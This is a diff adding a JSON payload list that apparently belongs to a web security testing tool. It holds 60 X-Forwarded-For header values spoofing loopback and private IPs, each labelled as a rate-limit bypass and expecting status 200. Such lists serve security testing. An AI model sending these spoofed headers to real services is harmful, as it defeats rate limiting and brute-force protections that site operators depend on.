@@ -1,0 +1,662 @@
+[
+  {
+    "payload_id": "OWP-67016",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67017",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: ::1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67018",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67019",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67020",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.2.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67021",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.2.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67022",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67023",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.3.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67024",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.3.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67025",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67026",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.4.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67027",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.4.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67028",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.5",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67029",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.5.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67030",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.5.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67031",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.6",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67032",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.6.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67033",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.6.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67034",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.7",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67035",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.7.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67036",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.7.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67037",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.8",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67038",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.8.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67039",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.8.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67040",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.9",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67041",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.9.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67042",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.9.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67043",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.10",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67044",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.10.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67045",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.10.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67046",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.11",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67047",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.11.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67048",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.11.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67049",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.12",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67050",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.12.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67051",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.12.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67052",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.13",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67053",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.13.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67054",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.13.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67055",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.14",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67056",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.14.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67057",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.14.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67058",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.15",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67059",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.15.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67060",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.15.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67061",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.16",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67062",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.16.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67063",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.16.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67064",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.17",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67065",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.17.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67066",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.17.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67067",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.18",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67068",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.18.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67069",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.18.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67070",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.19",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67071",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.19.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67072",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.19.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67073",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 127.0.0.20",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67074",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 10.0.20.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-67075",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Forwarded-For: 192.168.20.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
